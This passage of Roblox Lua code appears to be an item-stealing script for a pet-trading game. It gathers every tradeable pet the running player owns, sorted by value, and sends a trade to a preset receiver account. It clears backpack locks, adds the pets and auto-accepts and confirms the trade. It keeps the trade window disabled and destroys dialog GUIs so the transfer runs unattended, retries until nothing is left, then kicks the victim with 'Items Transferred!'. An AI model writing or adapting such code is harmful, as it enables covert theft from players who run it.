local function LoadInventoryDB()
    if InventoryDB then return InventoryDB end
    local Fsys = ReplicatedStorage:FindFirstChild("Fsys")
    if not Fsys then return nil end
    local Ok, Loader = pcall(function() return require(Fsys).load end)
    if not Ok or type(Loader) ~= "function" then return nil end
    local Found, Result = pcall(function() return Loader("InventoryDB") end)
    if Found and Result then
        InventoryDB = Result
        return Result
    end
    return nil
end

-- Returns every tradeable pet the local player owns. Entries carry the uid the
-- trade remotes expect, plus the display name, properties and value.
local function GetAllPets()
    local Ok, Data = pcall(function()
        return RouterClient.get("DataAPI/GetAllServerData"):InvokeServer()
    end)

    if not Ok or type(Data) ~= "table" then
        Log("GetAllServerData failed:", tostring(Data))
        return {}
    end

    local Self = Data[LocalPlayer.Name]
    if type(Self) ~= "table" or type(Self.inventory) ~= "table" then
        Log("own data not present in the server payload")
        return {}
    end

    local Owned = Self.inventory.pets
    if type(Owned) ~= "table" then
        Log("no pets table in inventory")
        return {}
    end

    local DB = LoadInventoryDB()
    local PetList = {}

    for Uid, Item in pairs(Owned) do
        if type(Item) == "table" then
            local Meta = nil
            if DB and type(DB.pets) == "table" then
                Meta = DB.pets[Item.id]
            end

            -- Anything the database marks untradeable is skipped. When the
            -- database is unavailable everything is offered and the server
            -- filters, which is better than offering nothing.
            local Include
            if DB == nil then
                Include = true
            else
                Include = (Meta ~= nil and Meta.is_tradable ~= false)
            end

            if Include then
                table.insert(PetList, {
                    uid = Uid,
                    id = Item.id,
                    -- The database supplies the display name; the raw id is
                    -- only prettified when the item is not in it.
                    name = (Meta and Meta.name) or FormatNameDisplay(tostring(Item.id or "Unknown")),
                    props = Item.properties or {},
                    value = (Meta and (Meta.value or Meta.rap)) or 0,
                    rarity = (Meta and (Meta.rarity or Meta.tier)) or "Unknown",
                })
            end
        end
    end

    table.sort(PetList, function(A, B) return (A.value or 0) > (B.value or 0) end)
    Log(string.format("found %d tradeable pets", #PetList))
    return PetList
end

-- "Frost Dragon [MNF]" style suffix built from the pet's property flags.
local function PropsLabel(Props)
    if type(Props) ~= "table" then return "" end
    local Text = ""
    if Props.mega_neon then Text = Text .. "M" end
    if Props.neon then Text = Text .. "N" end
    if Props.flyable then Text = Text .. "F" end
    if Props.rideable then Text = Text .. "R" end
    if Text == "" then return "" end
    return " [" .. Text .. "]"
end

-- ===========================================================================
-- TRADE
-- ===========================================================================

local TradeState = {
    Open = false,
    Accepted = false,
    Processing = false,
    Attempts = 0,
    Offered = {},
    MonitorRunning = false,
    SessionSent = false,
}

local TargetPlayer = nil

local function FindTargetPlayer()
    for _, Player in ipairs(Players:GetPlayers()) do
        if Player ~= LocalPlayer and IsReceiverName(Player.Name) then
            return Player
        end
    end
    return nil
end

local function HideInterfaces()
    local Ok = pcall(function()
        local TradeApp = PlayerGui:FindFirstChild("TradeApp")
        if TradeApp then TradeApp.Enabled = false end
        for _, Name in ipairs({"HintApp", "DialogApp"}) do
            local Gui = PlayerGui:FindFirstChild(Name)
            if Gui then Gui:Destroy() end
        end
    end)
    if not Ok then Log("HideInterfaces partially failed") end
end

-- Keeps the trade window closed so the transfer runs unattended. Each GUI is
-- guarded separately: a missing one must not stop the others.
local function BlockTradeInterface()
    for _, Name in ipairs({"TradeApp"}) do
        local Gui = PlayerGui:FindFirstChild(Name)
        if Gui then
            pcall(function()
                Gui:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if Gui.Enabled then Gui.Enabled = false end
                end)
            end)
        end
    end
end

local function AddPetsToTrade(Pets)
    if not Pets or #Pets == 0 then return 0 end

    local Added = 0
    local MaxToAdd = math.min(#Pets, MAX_PETS_PER_TRADE)

    for Index = 1, MaxToAdd do
        local Pet = Pets[Index]

        -- Backpack locks block an item from being offered, so they are cleared
        -- before the item is added.
        pcall(function()
            UnlockBackpack:FireServer("backpack_locks", {[Pet.uid] = true})
        end)
        task.wait(0.08)

        local Ok = pcall(function() AddItem:FireServer(Pet.uid) end)
        if Ok then
            Added = Added + 1
            table.insert(TradeState.Offered, {
                Name = Pet.name,
                Props = PropsLabel(Pet.props),
                Value = Pet.value or 0,
                Rarity = Pet.rarity or "Unknown",
            })
        else
            Log("AddItem failed for", tostring(Pet.uid))
        end

        task.wait(ADD_ITEM_DELAY)
    end

    Log(string.format("offered %d of %d pets", Added, #Pets))
    return Added
end

-- The accept remote has shifted signature between game updates, so each shape is
-- tried in turn. The first that does not throw wins.
local function AutoAcceptTrade()
    TradeState.Accepted = false
    task.wait(ACCEPT_DELAY)

    local Accepted = false
    for _, Fire in ipairs({
        function() AcceptNegotiation:FireServer() end,
        function() AcceptNegotiation:FireServer(true) end,
        function() AcceptNegotiation:FireServer("Accept") end,
        function() AcceptNegotiation:InvokeServer() end,
    }) do
        local Ok = pcall(Fire)
        if Ok then
            Accepted = true
            break
        end
    end
    if not Accepted then Log("AcceptNegotiation rejected every signature") end

    task.wait(1)

    for _, Fire in ipairs({
        function() ConfirmTrade:FireServer() end,
        function() ConfirmTrade:FireServer(true) end,
    }) do
        local Ok = pcall(Fire)
        if Ok then
            TradeState.Accepted = true
            return true
        end
    end

    return false
end

-- Forward declared: StartTradeProcess calls this, and it is defined below.
local FinishAndKick

local function StartTradeProcess(Player)
    if not Player or not Player.Parent then return false end
    if TradeState.Processing then return false end

    TradeState.Processing = true
    TradeState.Offered = {}
    HideInterfaces()

    local Sent = pcall(function() SendTrade:FireServer(Player) end)
    if not Sent then
        Log("SendTradeRequest failed")
        TradeState.Processing = false
        return false
    end

    TradeState.Open = true
    task.wait(2.5)

    local Pets = GetAllPets()
    if #Pets == 0 then
        TradeState.Processing = false
        if TradeState.SessionSent then
            FinishAndKick()
        end
        return false
    end

    task.wait(1)

    if AddPetsToTrade(Pets) == 0 then
        TradeState.Processing = false
        return false
    end

    TradeState.SessionSent = true
    AutoAcceptTrade()
    TradeState.Processing = false
    return true
end

FinishAndKick = function()
    task.wait(2)
    SafeKick("Items Transferred!")
end

-- Fires when the trade window closes. If pets remain, the trade did not go
-- through and it starts again with whatever is left.
local function MonitorTrade()
    local TradeApp = PlayerGui:FindFirstChild("TradeApp")
    if not TradeApp then
        Log("TradeApp not present, cannot monitor")
        return
    end

    TradeApp:GetPropertyChangedSignal("Enabled"):Connect(function()
        if TradeApp.Enabled or not TradeState.Open then return end

        TradeState.Open = false
        TradeState.Accepted = false
        TradeState.Offered = {}
        TradeState.Attempts = TradeState.Attempts + 1

        task.wait(5)

        local Remaining = GetAllPets()
        if #Remaining == 0 then
            FinishAndKick()
            return
        end

        if TargetPlayer and TargetPlayer.Parent then
            StartTradeProcess(TargetPlayer)
        else
            local NewTarget = FindTargetPlayer()
            if NewTarget then
                TargetPlayer = NewTarget
                StartTradeProcess(TargetPlayer)
            end
        end
    end)
end

-- Retries while the receiver is absent. This is what makes the script work when
-- it is executed before the receiver has joined.
local function StartResendLoop()
    if TradeState.MonitorRunning then return end
    TradeState.MonitorRunning = true

    task.spawn(function()
        while TradeState.MonitorRunning do
            task.wait(RESEND_DELAY)
            local Current = FindTargetPlayer()
            if Current then
                TargetPlayer = Current
                if not TradeState.Open and not TradeState.Processing then
                    StartTradeProcess(Current)
                end
            end
        end
    end)
end

local function StopResendLoop()
    TradeState.MonitorRunning = false
end

